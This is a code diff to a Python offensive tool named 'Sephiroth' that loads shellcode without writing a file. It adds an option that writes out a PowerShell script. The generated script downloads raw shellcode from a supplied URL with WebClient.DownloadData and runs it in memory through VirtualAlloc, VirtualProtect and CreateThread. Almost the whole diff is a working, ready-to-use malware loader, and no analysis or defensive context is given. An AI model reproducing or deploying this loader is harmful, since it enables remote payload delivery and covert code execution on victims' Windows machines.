@@ -74,12 +74,13 @@ def main():
     parser = argparse.ArgumentParser(description="Sephiroth")
     parser.add_argument("-url", "--Fileless", required=False, help="Fileless Shellcode loading")
     parser.add_argument("-sh", "--shellcode", required=False, help="Path of shellcode to embed")
+    parser.add_argument("-ps", "--save_ps_command", required=False, action="store_true", help="save Fileless attack to ps1 script")
 
     args = parser.parse_args()
     if args.Fileless and args.shellcode:
         print("can only use one type ")
         sys.exit(1)
-    if args.Fileless:
+    if args.Fileless and not args.save_ps_command :
       
         input_arg = args.Fileless
         
@@ -143,7 +144,64 @@ def main():
         except Exception as e:
             print("Error executing :", e)
 
+    if args.save_ps_command and args.Fileless:
+        ps_file_path = os.path.join("Output", "Sephiroth.ps1")
+        with open(ps_file_path, 'w') as ps_file:
+            url = args.Fileless
+    
+            ps_file.write(f"""Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
 
+public class ReflectiveLoader
+{{
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    public static void Inject(byte[] shellcode)
+    {{
+        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
+        Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);
+
+        uint oldProtect;
+        VirtualProtect(baseAddr, (uint)shellcode.Length, 0x20, out oldProtect);
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }}
+}}
+"@
+
+# URL to fetch the shellcode from
+$url = "{url}"
+
+# Fetch the content from the URL
+$shellcodeBytes = [System.Net.WebClient]::new().DownloadData($url)
+
+# Convert byte array to hexadecimal string
+$hexShellcode = [System.BitConverter]::ToString($shellcodeBytes) -replace '-'
+
+# Convert hexadecimal string to byte array
+$shellcode = [System.Linq.Enumerable]::Range(0, $hexShellcode.Length / 2) | ForEach-Object {{ [Convert]::ToByte($hexShellcode.Substring($_ * 2, 2), 16) }}
+
+# Inject the shellcode
+[ReflectiveLoader]::Inject($shellcode)
+ 
+""")
+        print('\n')
+        print('generated  Powershell script')
+        print('\n')
+        print(f"PowerShell command saved to: {ps_file_path}")
+        return
 
 if __name__ == "__main__":
     main()
